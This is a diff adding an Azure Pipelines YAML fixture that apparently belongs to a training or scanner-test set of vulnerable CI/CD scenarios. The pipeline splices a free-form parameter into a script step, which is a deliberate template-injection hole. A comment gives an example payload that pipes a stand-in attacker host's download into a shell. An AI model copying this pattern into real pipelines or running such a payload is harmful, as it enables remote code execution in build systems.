@@ -1,0 +1,26 @@
+# scenarios/50-azure-template-parameter-injection
+# CICD-SEC-4 (Poisoned Pipeline Execution) · CICD-SEC-3 — Azure Pipelines
+#
+# Pattern: a `${{ }}` template expression splices a free-form string PARAMETER
+# into the pipeline at COMPILE time. Because `${{ }}` expands before the
+# pipeline compiles, an attacker-controlled parameter value becomes pipeline
+# *structure* (extra steps/script), not just data — template injection.
+#
+# SAFETY: static fixture, nested under scenarios/ (never auto-run); `trigger`/
+# `pr: none` are belt-and-suspenders. See README.md.
+
+trigger: none
+pr: none
+
+parameters:
+  - name: userInput
+    type: string          # DANGER — free-form string, no allowed `values:` list
+    default: 'build'
+
+pool:
+  vmImage: ubuntu-latest
+
+steps:
+  # DANGER — the parameter is emitted verbatim as a script step at compile time.
+  # A caller passing  build && curl https://attacker.tld | sh  injects commands.
+  - script: ${{ parameters.userInput }}
